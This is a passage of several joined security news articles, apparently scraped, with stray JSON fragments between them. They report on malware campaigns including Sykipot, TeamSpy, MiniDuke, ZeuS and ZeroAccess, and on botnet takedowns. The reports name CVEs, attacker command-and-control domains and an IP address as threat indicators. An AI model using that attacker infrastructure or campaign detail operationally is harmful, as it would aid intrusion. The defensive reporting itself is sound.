compliance funding from any budgetary impacts from sequestration, and my team will continue working under that guidance,\" he said.         Congressman Frank Wolf, (R-Va), applauded the leadership of Langley Research Center March 18, noting that the facility moved quickly to review security after Jiang's arrest was made public. \"I would encourage all NASA centers to follow Langley’s lead to ensure that similar security issues are prevented at other centers,\" he said.  " }

The Sykipot attacks have exploited a number of zero-days during the past few years, including vulnerabilities affecting Adobe Reader, Adobe Flash Player and Microsoft Internet Explorer.  \"In the past most of the campaigns which we found related to the Sykipot actors were based on [spear-phishing] mails with attachments that exploited vulnerabilities in software like Microsoft Office, Adobe Flash, Adobe PDF and sometimes Internet Explorer,\" blogged Jaime Blasco, director of AlienVault Labs. \"During the last 8-10 months we have seen a change and the number of [spear-phishing] campaigns which have included a link instead of an attachment and this has increased. Once the victim clicks in the link the attackers will use vulnerabilities in Internet Explorer, Java, etc to access the system.\" The campaigns include one where a malicious site was set up in attempt to phish government employees by masquerading as a webpage about GSA SmartPay charge cards. The page also exploited CVE-2012-1889, a vulnerability affecting Microsoft XML Core Services. In another wave of attacks, the Sykipot actors registered several domains in September 2012 with the ultimate goal of exploiting a vulnerability in Internet Explorer (CVE-2012-4969). Another campaign in August exploited a Java vulnerability (CVE-2012-1723) to infect vulnerable systems, while a more recent spate of attacks targeted Japanese victims using an Adobe Acrobat exploit (CVE-2013-0640). \"The Javascript code inside the PDF file is very similar to the one found in the Itaduke samples but part of the initial variables and the obfuscation has been removed from the original one,\" Blasco explained. Once the PDF is opened, a document that appears to be a lure related to the Japanese Ministry of Health, Labour and Welfare is displayed. AlienVault first observed the attacks a few weeks ago. The company also published information on malicious domains associated with the attacks, as well as a list of unique email addresses registered with those domains. " }

For years, the TeamSpy Crew – so-named due to their abuse of the TeamViewer tool to remotely control computers – targeted high-level political and human rights activists throughout Eastern Europe and the Commonwealth of Independent States (CIS). After compromising a system, the attackers moved to steal a variety of information ranging from documents to detailed BIOS information. However the success of the attack can be mitigated by taking several steps. \"The exploit set used in the watering holes delivered with the Eleonore exploit kit were not zero-days, so patching could have prevented many of these successful intrusions,\" said Kurt Baumgartner, senior security researcher at Kaspersky Lab. In particular, the crew used two old vulnerabilities – CVE-2010-0188 (Adobe Reader and Acrobat) and CVE-2012-0507 (Oracle Java). Both these vulnerabilities have been patched by the products' respective vendors. As part of their scheme, the TeamSpy crew relied on watering hole attacks and exploit kits targeting the vulnerabilities to infect users. \"Our investigation of the team’s infrastructure centers around two domains used for command-and-control: 'politnews.org' and 'bannetwork.org',\" according to an analysis of the attack by Kaspersky Lab. \"But clearly, the strategy guiding this team is to pull off multiple 'watering hole' attacks, and sometimes pollute ad networks, inefficiently blanketing the region they are most interested in with malvertizing and redirections to their malicious sites. These two servers have been heavily used over years of attack campaigns, with more recent servers receiving tens if not hundreds of hits in the past week.\" Another potential safeguard against the attack is to block access to known command-and-control domains and IP addresses, which can be found in both the Kaspersky Lab paper and a paper by CrySyS (PDF) Lab at Budapest University of Technology and Economics. According to researchers, an examination of the command-and-control infrastructure shows that at least one of the domain names was registered back in 2004. Organizations should also identify and investigate any machines with presence of the teamviewer.exe application, advised Satnam Narang, security response manager at Symantec. \"Since Teamviewer is normally used in a wide range of conditions, it is not normally detected by security software with default settings,\" Kaspersky's researchers noted in their analysis. \"In addition, the modules are validated with digital signatures, once again, making them “trustworthy” to a range of whitelisting software.\" \"The complexity of the operation is fair because it was sustained and pretty well coordinated – the watering holes and their content took time to create and connect with interesting compromises over the course of years of operation,\" said Baumgartner. \"Also, there are aspects of the operation similar to Red October, although there are no direct links at the moment. Compared to Red October on a technical level, the TeamSpy crew and their toolset is far less complex and far less professionally done.\" \"[TeamSpy] uses a tampered Windows DLL, containing various utilities in conjunction with TeamViewer functionality, to spy on the hacker’s targets,\" Annett Wawczyniak, a technical support manager from TeamView Gmbh told SecurityWeek. \"The infection does not happen through TeamViewer but by unsecure sources like, e.g. email attachments, downloads or vulnerabilities in other software.\" \"The malware misuses a number of utilities via their tampered Windows DLL to collect Windows system information and code that communicates to webservers of an attacker and takes commands from it,\" Wawczyniak added. \"This way the toolkit modifies and misuses TeamViewer functionality.\" \"An indication of this infection is a file named avicap32.dll that is located outside the Windows system directory. To prevent an infection we recommend antivirus software with most recent definitions as well as current system updates,\" Wawczyniak said. Additional reporting by Mike Lennon " }

A highly detected infection in August came from variants of ZeuS/ZBot, mainly as a result of do-it-yourself ZBot botnet kits that provide malware creators the tools required to build and administer a their own botnet. These botnet kits are by no means new to the market, but have gained serious momentum recently. The botnet kits even include an easy to use control panel application to maintain/update the botnet, and to retrieve the captured information. A configurable builder tool allows the author to create the executables that will be used to infect victim's computers. These ZeuS/ZBot trojans are typically spread via spam and black hat SEO poisoning, appearing to come from legitimate sources, asking recipients to click on a link which installs the malware and then sits silently, waiting for users to enter in their credentials to particular sites such as an online banking site. As SecurityWeek noted earlier this month, ZeuS variants had been discovered that target U.S. military personnel. In addition to the ZeuS/ZBot threat, another notable attack in Auguest was the Windows Help Center vulnerability, which made it to the top position in Fortinet’s Top 10 attack list. The attack (CVE-2010-1885) experienced an exceptionally large spike in activity earlier in August. Exploitation of this attack can be rather potent since the vulnerability is NOT Web browser-specific. Additionally, Fortinet research showed ransomware variant TotalSecurity making its biggest comeback since March. Ransomware is malware, usually disguised in fake anti-virus software, that locks out applications and data from a user’s PC and then demands ransom for restored access. TotalSecurity loader (W32/FakeAlert.LU) was the no. 1 malware detected this month by Fortinet’s FortiGuard Labs. “One indicator we observed this month was that the Ransomware application had gone server-side polymorphic, which means that the loader will connect to a single server and request a single file, but the code changes on an hourly basis in order to avoid detection,” said Derek Manky, project manager, cyber security and threat research, Fortinet. “This is a technique typically seen with botnets, such as Waledac, and has been picked up by the developers of TotalSecurity. This is another example of how relying purely on antivirus is not a silver-bullet approach to protecting systems from infection.” FortiGuard Labs compiled threat statistics and trends for August based on data collected from FortiGate network security appliances and intelligence systems in production worldwide.

This particular Android banking Trojan is distributed via phishing links and pretends to be an app that checks certificate to ensure they are valid, Carlos Castillo, a malware researcher with McAfee Labs, wrote in a blog post Wednesday. Similar types of Android malware attacked banking customers in South Korea and India, and malware posing as mobile banking apps have been found in Spain and Portugal, Castillo said.  This Android Trojan's execution is very simple. It prompts the user to enter a password for the online banking account. When the user submits the password, the malware saves the information for future fraud. The user sees a screen with a fake security token. This part is similar to what has been seen in other Android banking Trojan families, Castillo said.  Android banking Trojans infect phones and steal passwords when victims log onto their online bank accounts. Castillo called it a \"very profitable line\" of work for mobile malware developers.  Unlike earlier variants of the Trojan, this version does not send the password it harvested from the user to the attacker via Internet or SMS message. Instead, the malware sends an SMS to a specific Russian phone number with the message \"I am here,\" in Russian, or \"init,\" the first time the application runs, Castillo said. After the app is closed, the malware remains running in the background in order to intercept all incoming SMS messages.  However, not all captured messages are forwarded on to the remote control server. Instead, the malware runs through two filter mechanisms to isolate messages that contain the banking code generated by the banks' servers and sent to the user via SMS to authenticate the transaction. The malware then calculates if the code is still valid by checking the difference between when the SMS was sent and the current time. If the code has expired, the SMS is not forwarded to the server, Castillo found.  One variant in this particular Android family masquerades as Trusteer Rapport, the banking security application from Trusteer, Castillo wrote. The fake Trusteer app looks entirely different from other Android Trojans, but exhibits the same behavior.

Web vulnerabilities lead the way, representing more than half of the 4,396 publicly disclosed vulnerabilities documented by the X-Force Research & Development team in the first half of 2010. This represents a 36 percent increase over the same time period last year, with 55 percent of the disclosed vulnerabilities having no vendor-supplied patch at the end of the period. Keep in mind that these figures don’t include custom-developed Web applications, which can also contain vulnerabilities. On the positive side, the report noted that organizations were doing more to identify and disclose security vulnerabilities than in the past, helping to drive more open collaboration to identify and eliminate vulnerabilities before cyber criminals can exploit them. Microsoft and Adobe’s collaboration to facilitate advanced information sharing on vulnerabilities via its Microsoft Active Protections Program (MAPP) is a good example of such progress. MAPP is a collaborative effort involving 65 global members that facilitates the sharing of product vulnerabilities with security software providers. \"This year's X-Force report reveals that although threats are on the rise, the industry as a whole is getting much more vigilant about reporting vulnerabilities. This underscores the increased focus among our clients to continue looking for security solutions that help them better manage risk and ensure their IT infrastructure is secure by design,\" said Steve Robinson, general manager, IBM Security Solutions. The report noted that hidden attack methods grew in volume and complexity, with JavaScript being a major avenue of attack. Attackers are using sophisticated means to penetrate networks without being detected by traditional security tools. JavaScript obfuscation has been a popular technique used by all classes of cybercriminals to hide their exploits within document files and Web pages. IBM detected a 52 percent increase in obfuscated attacks during the first half of 2010 versus the same period in 2009. PDF exploits continue to soar as attackers trick users in new ways. The widespread use of PDF-based exploits spiked during the first half of 2009, capturing three of the top five slots for browser exploits used in the wild since. Another Positive trend! Phishing activity declined significantly during the period, with the first half of 2010 seeing a fraction of the phishing attacks that were seen at the peak in 2009, a decline of almost 82 percent. The decline in phishing during the period is possibly a result of Avalanche, a notorious cybercrime gang, at one time responsible for two-thirds of all phishing attacks, discontinuing its phishing endeavors in favor of using malware. Financial institutions are still the number one phishing target, representing about 49 percent of all phishing emails, while credit cards, governmental organizations, online payment institutions and auctions represent the majority of other targets. Looking into the future, the X-Force Research and Development team has identified some key trends to watch for in the future, including: Cloud Computing -- As an emerging technology, security concerns remain a hurdle for organizations looking to adopt cloud computing. Virtualization - X-Force's vulnerability data shows that 35 percent of vulnerabilities impacting server class virtualization systems affect the hypervisor, which means that an attacker with control of one virtual system may be able to manipulate other systems on the same machine. The IBM X-Force Report comes from IBM's X-Force team, which gathers facts from numerous intelligence sources, including its database of over 50,000 computer security vulnerabilities, millions of intrusion events monitored on tens of thousands of managed network sensors deployed on customer networks throughout the world, its global Web crawler and its international spam collectors.

According to their analysis, the new infection vectors leverage vulnerabilities in Java and Internet Explorer.  Specifically, a webpage serves \"JavaApplet.class\", which implements a Java exploit for CVE-2013-0422. The code of the exploit is similar to the one published in the Metasploit kit, but the inner class that disables the security manager is encoded differently – most likely to avoid detection, explained Igor Soumenkov of Kaspersky Lab in a blog. Internet Explorer 8 users are targeted using CVE-2012-4792, which was patched in January. \"The exploits are located in separate web pages,\" the researcher blogged. \"Clients using Internet Explorer version 8 are served with \"about.htm\", for other versions of the browser and for any other browser capable of running Java applets, the JavaScript code loads \"JavaApplet.html\".\" The finding is the latest twist in the discovery of MiniDuke, which has been linked to attacks against government agencies in countries such as the Ukraine, Belgium, Ireland, Portugal, Romania and the Czech Republic. A Hungarian research foundation as well as two think-tanks and a healthcare provider in the U.S. were also compromised. Last week, researchers found that a variant of the malware dates back to at least June 2011, predating the version researchers initially found. \"It is very sophisticated in terms of coding skill and social engineering,\" Razvan Stoica, communication specialist at BitDefender Labs, told SecurityWeek. \"It is very simple also, in that it doesn't have nearly as many \"moving parts\" as, say, Stuxnet.\"  Though the exploits mentioned above were already known and published at the time of the attack, they were still very recent and could have worked against any designated targets, Soumenkov wrote. \"Although the exploits were already known and published at the time of the attack, they were still very recent and could have worked against designated targets,\" the researcher blogged. \"As previously recommended, updating Windows, Java and Adobe Reader to the latest versions should provide a basic level of defense against the known MiniDuke attacks. Of course, it is possible that other unknown infection vectors exist; we will continue to monitor the situation and update the blog with new data when appropriate.\" " }

The report covers several topic areas ranging from malware, cybercrime, and spam trends to revealing the findings of a survey of attitudes toward cyberwarfare and cyber-espionage, as well as other IT security developments and statistics. Malware and Cybercrime Cybercrime is a massive and growing industry, proving to be incredibly profitable for many, and in a weak economy, getting involved is an attractive undertaking for individuals around the world. In the first half of 2010, Sophos received an average of 60,000 new malware samples every day, about 1 every 1.4 seconds. Considering that it’s virtually impossible for Sophos to receive every piece of malware, you can be sure cybercriminals are cranking out malware at an even faster rate than this. These figures are 50% higher than the same time last year, with Sophos receiving about 40,000 malware samples per day. For malware distribution, the Web is still the dominant home for malware with Blackhat SEO (search engine result “poisoning”) being the current favorite method for propagation. Web servers in the U.S. hold the top spot for hosting malicious Web pages with 43% of the global total. China follows in a distant second place with 10.75% and Russia follows as the number three host of malware at 6.13%. “The biggest issue is that a lot of these websites are legitimate ones that have been targeted by hackers – businesses could end up infecting their customers, leaving them open to fraud,” said Graham Cluley, senior technology consultant at Sophos. Cyber Espionage and Cyberwarfare  In addition to SophosLabs’ malware and cybercrime research, the company conducted a worldwide survey, which uncovered some interesting attitudes toward international cyber-espionage and cyberwarfare. Respondents were asked questions including whether they thought spying via hacking or malware attacks is an acceptable practice and if the computer networks of private companies in other countries are legitimate targets. •\t63% of those polled believe that it is acceptable for their country to spy on other nations by hacking or installing malware (23% said yes at any time, 40% said only during wartime, 37% said no) •\t1 in 14 respondents believe that crippling denial of service attacks against another country’s communication or financial websites are acceptable during peacetime (49% said only in wartime, 44% said never) •\t32% believe that countries should be allowed to plant malware and hack into private foreign companies in order to spy for economic advantage (23% said this was only acceptable in wartime, 9% said in peacetime, 68% said no) The survey was conducted from April through May of this year on Sophos’ website and Facebook page. 1,077 people responded from 57 total countries – the most being from the US and UK. In January, ‘Operation Aurora,’ a targeted attack against Google and several other companies, resulted in Google accusing Chinese hackers of cyberwarfare. “Hacking and virus-writing began as a hobbyist activity, often designed to prove how smart the programmer was, rather than to cause serious long-term harm. It evolved into organized criminal activity, with the lure of large amounts of money and now, in 2010, it could be argued that the third motivation is using malware and the internet to gain commercial, political, and military advantage over others,” said Cluley.

MiniDuke was first publicized last week after it was analyzed by researchers with Kaspersky Lab and CrySys Lab at the Budapest University of Technology and Economics. The malware, which exploited a recently patched vulnerability in Adobe Reader, has been used as part of an attack on a series of high-profile government targets in countries such as the Ukraine, Belgium, Czech Republic and others. In addition, two think-tanks and a healthcare provider in the U.S. were also targeted, as was a research foundation in Hungary. According to BitDefender, the recently-discovered sample dates back to at least June 20, 2011, predating the other version by a year. \"The discovery of this older MiniDuke malware strain raises questions about the origin of the 2012 samples and the malware as a whole,\" BitDefender Chief Security Strategist Catalin Cosoi said in a statement. \"The switch from a US Navy clock to a Chinese clock suggests the malware's designers are simply throwing up a smoke cloud as to their identity.\"  There has been much speculation about the origins of MiniDuke.  A spokesperson for Romania's SRI secret service told Reuters March 1 that the situation appeared to be tied with an \"entity that has the characteristics of a state actor,\" though the agency did not identify any potential perpetrators. \"Our estimations show the attack is certainly relevant to Romania's national security taking into account the profile of the compromised entities,\" SRI spokesman Sorin Sava told Reuters. As of March 4, the newly discovered MiniDuke sample was still seeking encrypted command and control instructions via an active Twitter account, with a single instruction dated February 21st, 2012. The 2011 version does not use Google to search for command and control instructions, and lays dormant if it can't connect to Twitter, according to BitDefender. All the versions of the malware are designed to steal information, Cosoi said. \"MiniDuke was clearly designed as a cyber-espionage tool to specifically target key sensitive government data,\" he said. \"This casts a degree of doubt on who designed MiniDuke.\" " }

According to Adobe, the attackers look to trick users into clicking a link that directs them to a website serving malicious Flash content. If exploited successfully, an attacker could use the vulnerabilities to either crash or take control of a vulnerable system, the company said. In addition to those two bugs, Adobe also fixed a buffer overflow issue in a Flash Player broker service that can be used to execute malicious code (CVE-2013-0504). Today's update is part of what has been a busy month for Flash Player security. On Feb. 7, the company released a fix for two other vulnerabilities being exploited in attacks.

The Mandiant report tied a spate of attacks against U.S. corporations to a division of China's People's Liberation Army known as Unit 61398 that reputedly heads up the country's cyber-espionage operations. Now, attackers are hoping interest in the report's findings will be enough to get users to open a malicious PDF file. Multiple attacks have been detected by security researchers. The first exploits a vulnerability for Adobe Acrobat and Adobe Reader that was just recently patched (CVE-2013-0641). According to Symantec, the attachment is made to look the report and uses the name of the company in the filename. However, as in many targeted attacks, the email is sent from a free email account, and the content of the email – which is written in Japanese – uses poor grammar. Though the attack detected by Symantec failed to drop any malware, researchers at Seculert said they analyzed an attack exploiting the same vulnerability that dropped malware that communicates with a command-and-control server using the dynamic DNS domain name expires.ddn.dynssl.com. The C&C server itself is hosted in Korea. The malware also communicates with several legitimate Japanese websites – most likely to divert security products into thinking it is legitimate software, Seculert speculated. The second attack, researcher Brandon Dixon highlighted an attack that appears to be targeting Chinese journalists. This attack targets CVE-2011-2462, an older vulnerability in Adobe Reader. The payload of the attack has been used in the past, Dixon explained. \"Once executed on the system, a new process under the name \"AdobeArm.tmp\" was identified running and the original Mandiant APT1 report is shown,\" he blogged. \"This payload was collected back on November 6th, 2012 and was completely unchanged showing a reuse in payloads even after several months.\" \"The newly spawned process waited several minutes before contacting itsec[.]eicp[.]net:443, a domain that was used in many previous attacks against human rights activists,\" he continued. \"It should also be noted that this domain showed up with malware on both Windows and Mac OS X systems. At the time of running, the command and control was resolving to 114[.]248[.]101[.]105.\" According to Seculert, the malware involved in the attack communicates with a C&C using the dynamic DNS domain itsec.eicp.net. \"This same domain name was used by a watering hole attack, targeting Dalai Lama activists back in December 2012,\" the firm noted. \"Back then there were two different malware variants communicating with the same C2 server. One variant was created for users using Windows operating system, while the other variant was created specifically for OSX victims.\" " }

When an online banking customer has initiated a secure online banking session, the Zeus Trojan injects a fake version of the familiar Verified by Visa and MasterCard SecureCode enrollment screen. It then prompts users to enter their social security number, credit or debit card number, expiration date, and PIN or CSV code.  The information gathered by Zeus is used by fraudsters to commit ‘card not present’ transactions with retailers that employ Verified by Visa and SecureCode protection. This stolen data allows criminals to impersonate their victims and register with these programs to ensure fraudulent transactions pass through fraud detection systems undetected. “Advanced, stealthy Trojans like Zeus that are detected less than 46% of the time are readily available to online criminals who are interested in stealing information for illegal gain,” according to Uri Rivner, Head of New CyberCrime Technology at RSA, The Security Division of EMC. Trusteer discovered this new in-session phishing attack, and was able to collect Zeus configurations and code samples from infected computers. This version of Zeus attempts to trick online banking customers into surrendering their personal and credit/debit card data by claiming new FDIC rules require that they enroll in the Verified by Visa / MasterCard SecureCode program to protect their accounts. “While some users may become suspicious when prompted to enter their credit/debit card information as part of the online banking login process, this attack uses the familiar Visa and MasterCard online fraud prevention programs to make the request appear legitimate,” said Amit Klein, CTO of Trusteer and head of the company’s research organization. “Fortunately, online banking customers protected by Trusteer Rapport are not vulnerable to this attack since it blocks HTML injection and prevents Zeus from presenting the fraudulent enrollment request.” Zeus, also known as Zbot, WSNPOEM, NTOS and PRG, is the most prevalent banking malware platform for online fraud, and has been licensed by numerous criminal organizations. Zeus infects PCs, usually without users knowing or causing any other “noticeable” harm. The program then waits for the user to log onto a list of targeted banks and financial institutions, and then steals login credentials and other data which are immediately sent to a remote server hosted by cybercriminals. It can also modify, in a user’s browser, the genuine web pages from a bank’s web servers to ask for personal information such as payment card number and PIN, one time passwords, etc. Anti malware detection of Zeus has a poor track record. In a 2009 report based on information gathered from 3 million desktops in North America and the UK Trusteer found that the majority of Zeus infections occur on antivirus protected machines. Specifically, Trusteer found that among Zeus infected machines 55% had up-to-date Antivirus protection installed. The population of machines infected with Zeus is enormous -- one in every 100 computers according to Trusteer research.

This page then asks the victim to install a special version of the Flash Player in order to see the video content. Victims using Google Chrome are then taken to the plugin’s page on the Chrome store and asked to install an extension named 'Business Flash Player!' - a rogue extension for the browser that can access Facebook cookies and \"Like\" pages on the user’s behalf. The extension is still available, and was installed roughly 40,000 times yesterday alone, noted Bogdan Botezatu, senior e-threat analyst at Bitdefender. The script that dictates to the users' browser what page to automatically \"Like\" however is currently down, he said. \"We have also detected a similar extension for Firefox spread via the same scam, but we’re just digging into it, so we can’t offer much info yet,\" he told SecurityWeek. \"We know that at some point, the Chrome extension was also used for posting messages from the victims’ accounts, not only for liking specific pages,\" he said. \"Since the script is fetched by the extension from the web, the extension can easily be programmed to do pretty much anything with the Facebook account. We found one of these spam messages on Facebook and that is how we got to the extension in the first place.\" The page pointing to the malicious Chrome extension is targeted at Turkish users, and the spam messages posted on Facebook were written in Turkish. Bitdefender does not know however if there are other pages that redirect to the extension as well. According to Botezatu, scamming their way to Facebook \"Likes\" can be a road to profit for cyber-criminals. Facebook \"Likes,\" he noted, increase the EdgeRank for a specific page. A page's EdgeRank measures the likelihood the page will appear in a Facebook Newsfeed. \"Up until July 2012, Facebook pages were grown and then sold to whoever had an interest in buying a page with a huge community around it, pending rebranding,\" he explained. \"However, as the name of the page can’t be changed anymore if it has 200 likes or more, cyber-criminals are now focused on increasing the visibility of a page on demand – it’s basically inexpensive and borderline illegal social media for various businesses. This can also be used for disseminating malware – for instance, if the page owner suddenly decides to post malicious links on it, all users who have liked the page will see these links and some of them would probably fall for clicking them.\" " }

Blended attacks use e-mail or search engine results to lure victims to bogus web sites, where the victims then encounter spam advertising, malware, or phishing scams. Fraudsters are also using trusted brands like Apple and Google, holidays such as Mother’s Day, and current events such as the Football World Cup to build traffic. Spam related to the World Cup began appearing in January, according to a separate report by AppRiver. During Q2, Gmail and Yahoo kept their top spots as spoofed domains for e-mail distribution, but they have now been joined in the top six by Twitter. The Twitter domain was faked in a widespread mailing designed to lure users to a “password reset” Web page that contained malware. Other highlights from the Commtouch’s Q2 Trend Report indicate the extent to which spam has come to dominate e-mail traffic. It averaged 82% of all e-mail traffic throughout the quarter, bottoming out at 71% at the start of May and peaking at nearly 92% near the end of June. These numbers equate to an average of 179 billion spam messages per day. In another disturbing trend, an average of 307,000 zombies were activated daily, representing a slight increase over the prior quarter. According to Commtouch, the reported global spam levels are based on Internet e-mail traffic as measured from unfiltered data streams, and do not include internal corporate traffic. Global spam levels will therefore differ from the quantities reaching end-user in boxes, due to several possible layers of filtering. " }

Earlier today, Burger King's Twitter account was compromised to promote McDonald's, one of its chief rivals in the fast food business. Burger King did not respond to a request for comment by SecurityWeek about the incident before publication. However, the compromised account was made to feature a picture of McDonald's 'fish mcbites' as well as a message starting that Burger King “just got sold to McDonalds because the whopper flopped =[ FREDOM IS FAILURE℠.\" The account also pointed to a fake press release that seems to have been placed on Burger King's official website.  In response to the incident, McDonald's issued a tweet denying responsibility. \"We empathize with our @burgerking counterparts,\" the tweet reads. \"Rest assured, we had nothing to do with the hacking.\" The compromise of the Burger King account follows revelations this month that Twitter had been compromised by hackers and forced to reset the passwords of 250,000 of its users. In the aftermath of that incident, Bob Lord, director of information security at Twitter, warned users not to use weak passwords to protect their accounts. \"Make sure you use a strong password – at least 10 (but more is better) characters and a mixture of upper- and lowercase letters, numbers, and symbols – that you are not using for any other accounts or sites,\" he blogged. \"Using the same password for multiple online accounts significantly increases your odds of being compromised.\" " }

Trend Micro’s annual survey on such usage indicates that globally, social networking at the workplace has steadily risen from 19 percent in 2008 to 24 percent in 2010. More alarming is the fact that the users most likely to visit social networking sites do so on laptops (29 percent versus 18 percent for desktops), and laptop users who can connect to the Internet outside of company networks are more likely to share confidential information via instant messages, Web mail and social media than those who are always connected to a company network.  According to Trend Micro’s analysis, workers are likely to succeed in thwarting prohibitions on workplace visits to social networks. A better policy that prohibition, the company argues, is to allow such visits, because they are then more likely to be made over corporate networks that can cope with threats.  There is no question that threats exist and that social networks have become an viable malware distribution platforms. KOOBFACE alone, the “largest Web 2.0 botnet,” controls and commands around 51,000 compromised machines globally.  David Perry, Trend Micro’s global director of education, summed up the situation as follows: “Most companies’ concerns around social networking in the office center around the loss of employee productivity. What they may not realize is that many social networking sites are built on interactive technologies that give cybercriminals endless opportunities to exploit end users, steal personal identities or business data, and corrupt corporate networks with malware.” Related Reading: New Compliance Tool Helps Companies Utlizing Social Media Related Reading: Report Shows Heavily Regulated Industries Letting Social Networking Apps Run Rampant " }

ZeroAccess is mainly designed to distribute malware as part of a massive ad-click fraud campaign that at one point last year was estimated to be raking in as much as $100,000 a day for its operator. Another version of the botnet also makes money through Bitcoin mining. According to Kindsight, versions of the ZeroAccess botnet occupied the number one and seven spots on the list of top high-level malware threats on the Web.   ZeroAccess is so prevalent because it uses an aggressive pay-per-install affiliate campaign to spread malware – something the botnet's controllers can afford because it is earning top dollar through ad-click fraud, explained Kevin McNamee, security architect at Kindsight. \"The first version of ZeroAccess used rootkit technology to evade antivirus software,\" he said. \"But the latest version doesn’t even bother--it disables the antivirus during the installation process.\" \"Once installed, ZeroAccess keeps a low profile and doesn’t do anything to draw attention to itself,\" he continued. \"Users don’t know they’re infected. The peer-to-peer command-and-control (C&C) protocol doesn’t have any centralized control service that can be monitored or taken out. This also means that the C&C can’t be traced back to an individual or group. It doesn’t use the DNS infrastructure that carriers commonly monitor to detect bot activity and doesn’t generate any traffic anomalies that can be detected either.\" Rounding out the list of the top four malware threats in the final quarter of the year are the infamous TDSS and Alureon rootkits – at numbers 2 and four, respectively – and a threat known as AgentTK, which doubled the number of home networks it infected between the third and fourth quarters. \"There was a significant increase in [AgentTK] activity over the holiday period, which can be linked to some new C&C [command and control] sites in China,\" according to the report. \"This increase was probably the result of a holiday season spam campaign to get the malware installed. This threat is a Trojan downloader that accesses remote websites and attempts to download and install malicious or potentially unwanted software.\" Overall, the network infection rate stood at 11 percent in Q4, dropping from 13 percent in the third quarter. Among those that were infected, the ZeroAccess botnet was the most common infection found in Kindsight deployments on home networks. Six percent of broadband users were infected with high-threat level malware such as bots, rootkits or banking Trojans. For mobile networks that figure is just 0.5 percent of devices. But while that number is relatively small, it has increased 67 percent when compared to the third quarter, and the number of Google Android malware samples increased by 5.5 times. \"The biggest threat in the BYOD scenario is the ability of the device to record calls, text messages and email; track its location; take pictures; and explore local networks,\" McNamee said, adding that the firm is currently tracking eight different spy-phone variants. \"This provides the attacker with a full featured, remote access backdoor into a corporate network. The number of mobile malware species of this type is actually quite small compared to the run-of-the-mill SMS Trojans, but the threat level is significantly higher, particularly in a targeted attack.\" " }

Mobile viruses disguised as \"Free World Cup VOD\" and other hot topics, were identified last week by mobile security software firm NetQin Mobile. The company said that more than 500 complaint cases were reported and filed on June 23. Identified as ShadowSrv.A, FC.Downsis.A, BIT.N and MapPlug.A, these viruses are embedded in mini mobile games to lure users to download. Once downloaded, the device will be controlled by the virus originator. The virus propagation model is similar to computer \"botnets,” the term generally used to describe security threats on PCs, where a group of computers infected with malware that is controlled by one owner or software source. \"The explosion of mobile applications has made smart-phones an enticing target for virus authors. Many security threats that were once only spread on PCs, such as botnets, are now moving to mobile devices to maximize the financial interest,\" said Dr. Lin Yu, CEO of NetQin. The viruses usually either send messages to all the contacts of the address book directly, or send messages to random phone numbers by connecting to the server; both of which result in extra charges to the user's phone bill. The viruses can “cover their tracks” and often delete the sent messages from a user's Outbox and SMS log. The messages sent by viruses are themed the hottest topics, including Free World Cup VOD, and the most popular blind date TV show, etc. All messages contain URLs linked to malicious sites that users are unable to see until they've already clicked and fallen into the virus trap. The botnets are targeting mobile devices with S60 3rd and 5th OS, with estimated 100,000 mobile phones impacted so far.

Working together, the companies targeted the Bamital botnet, which hijacked people's search results and took them to malicious websites that served malware that would either steal their personal information, or fraudulently charge businesses for online advertisement clicks. \"Microsoft and Symantec’s research shows that in the last two years, more than eight million computers have been attacked by Bamital, and that the botnet’s search hijacking and click fraud schemes affected many major search engines and browsers, including those offered by Microsoft, Yahoo and Google,\" blogged Richard Domigues Boscovich, assistant general counsel with Microsoft Digital Crimes Unit. \"Because this threat exploited the search and online advertising platform to harm innocent people, Microsoft and Symantec chose to take action against the Bamital botnet to help protect people and advance cloud security for everyone.\" Both companies are proactively informing people if their computers are infected Bamital through an official webpage that offers victims an easy-to-use method to remove the infection, Boscovich added. According to Symantec, Bamital’s origin goes back to late 2009 and has evolved in multiple ways during the past couple of years. \"Bamital has primarily propagated through drive-by-downloads and maliciously modified files in peer-to-peer (P2P) networks,\" according to Symantec's Security Response team. \"From analysis of a single Bamital C&C server over a six-week period in 2011 we were able to identify over 1.8 million unique IP addresses communicating with the server, and an average of three million clicks being hijacked on a daily basis. Recent information from the botnet shows the number of requests reaching the C&C server to be well over one million per day.\" The takedown, known as Operation b58, is the sixth anti-botnet operation by Microsoft in the past three years. On Jan. 31, Microsoft filed a lawsuit supported by a declaration from Symantec against the botnet's operators in order to \"sever all the communication lines between the botnet and the malware-infected computers under its control,\" blogged Boscovich. The court granted Microsoft's request and on Feb. 6, Microsoft – escorted by the U.S. Marshals Service – seized valuable data and evidence on the botnet from web-hosting facilities in Virginia and New Jersey. \"We’ve found that cleanup efforts like this not only help clean people’s computers, but they also take the very infrastructure the botnet needs to be impactful and profitable away from the cybercriminals,\" Boscovich added.  \"This case and operation are ongoing, and we’ll continue to provide updates as they become available,\" he wrote.  " }

The month of June showed new variations of the Sasfis botnet entering the Top malware 10 list along with the re-emergence of older threats. Sasfis, which has been competing with the Pushdo botnet in terms of sheer volume, was very active this month. “We observed Sasfis loading a spambot component, which was heavily used to send out binary copies of itself in an aggressive seeding campaign,” said Derek Manky, project manager, cyber security and threat research, Fortinet. “The Sasfis socially-engineered emails typically had two themes; one looked like a fake UPS Invoice attachment, and the other was disguised as a fees statement. Much like the Pushdo and Bredolab botnets, Sasfis is a loader - the spambot agent is just one of multiple components downloaded.”  In June, Fortinet discovered the re-emergence of a hit-and-run attack with an Internet Explorer HTML Object Memory Corruption Vulnerability (known as CVE-2010-0249 at Microsoft and MS.IE.Event.Invalid.Pointer.Memory.Corruption at Fortinet). This attack first surfaced in January 2010 and used in the infamous Aurora attacks to plant spy trojans within targeted, major corporations. The attack has since subsided, last appearing in FortiGuard’s top 10 in February’s Threat Landscape report. Additional threat activities for the month of June include: • 200 New Vulnerabilities: FortiGuard Labs covered more than 200 new vulnerabilities this period, nearly double from last report.  • Flash and Excel Vulnerabilities: Four Flash and Excel vulnerabilities were disclosed and patched this period. • Malicious Javascript Code: In terms of malware, the only detection that topped the aforementioned botnet binaries was JS/Redir.BK - obfuscated JavaScript code, which had a surge of activity on June 12 and June 13. The JavaScript code redirected users to various legitimate domains hosting an injected HTML page named \"z.htm.\" Top 10 Attacks for June 2010 FortiGuard observed JavaScript code was circulated through an HTML attachment in spam emails using various themes. In one attack, the HTML containing the malicious JavaScript code was attached as the file \"open.htm\" in an e-mail urging the user to update their MS Outlook client. The exact same e-mail also circulated with a FakeAV binary attachment, once again proving that spam templates are often recycled for various attacks. In another example, a “bad news” email socially engineered for the FIFA World Cup, had the same malicious JavaScript attached through a file named \"news.html.”  “There is no doubt that JavaScript is one 